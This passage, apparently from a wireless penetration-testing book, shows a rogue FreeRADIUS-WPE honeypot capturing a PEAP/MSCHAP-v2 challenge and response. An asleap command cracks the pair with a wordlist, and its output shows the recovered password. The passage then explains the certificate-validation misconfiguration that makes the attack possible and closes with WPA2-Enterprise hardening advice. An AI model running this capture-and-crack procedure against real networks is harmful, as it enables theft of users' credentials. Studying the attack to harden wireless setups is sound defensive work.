    \ fe:94:f3:d9:9b:13:54:b9\n         response: db:68:44:c6:7b:6d:f8:05:b2:1c:86:2f:0a:18:3b:d0:13:e0:21:00:f1\n\
    :69:17:fc\n         john NETNTLM: Monster:$NETNTLM$fe94f3d99b1354b9$db6844c67b6df805b21c862f\n\
    0a183bd013e02100f16917fc\n```\n\n9. We now use asleap to crack this using a password\
    \ list file that contains the password \"abcdefghi\", and we are able to crack\
    \ the password! (For the purposes of this demonstration, we simply created a one-line\
    \ file called list with the password in it):\n\n```\nroot@kali:/usr/local/var/log/radius#\
    \ asleap -C fe:94:f3:d9:9b:13:54:b9 -R db:68:\n44:c6:7b:6d:f8:05:b2:1c:86:2f:0a:18:3b:d0:13:e0:21:00:f1:69:17:fc\
    \ -W list\nasleap 2.2 - actively recover LEAP/PPTP passwords. <jwight@hasborg.com>\n\
    Using wordlist mode with \"list\".\nhash bytes:    9052\nNT hash:       e18614f7c6811f043fbf54205e929052\n\
    password:      abcdefghi\n```\n\nWe set up our Honeypot using FreeRADIUS-WPE.\
    \ The enterprise client is misconfigured to not use certificate validation with\
    \ PEAP. This allows us to present our own fake certificate to the client, which\
    \ it gladly accepts. Once this happens, MSCHAP-v2, the inner authentication protocol,\
    \ kicks in. As"
  merge: -1
  pgno: 146
- img_proc: true
  md: 'the client uses our fake certificate to encrypt the data, we are easily able
    to recover the username, challenge, and response tuples.


    MSCHAP-v2 is prone to dictionary attacks. We use asleap to crack the challenge
    and response pair, as it seems to be based on a dictionary word.


    PEAP can be misconfigured in multiple ways. Even with certificate validation enabled,
    if the administrator does not mention the authentic servers in connect to these
    servers list, the attacker can obtain a real certificate for another domain from
    any of the listed certifying authorities. This will still be accepted by the client.
    Other variations of this attack are possible as well.


    # Security best practices for Enterprises


    We have seen a ton of attacks against WPA/WPA2, both Personal and Enterprise.
    Based on our experience, we recommend the following:


    +   - For SOHOs and medium-sized businesses, use WPA2-PSK with a strong passphrase.
    You have up to 63 characters at your disposal. Make use of them.

    - For large enterprises, use WPA2-Enterprise with EAP-TLS. This uses both the
    client- and server-side certificates for authentication, and currently is unbreakable.

    - If you have to use PEAP or EAP-TTLS with WPA2-Enterprise, then ensure that certificate
    validation is turned on, the right certifying authorities are chosen, RADIUS servers
    that are authorized are used, and finally, that any setting that allows users
    to accept new RADIUS servers, certificates, or certifying authorities is turned
    off.'
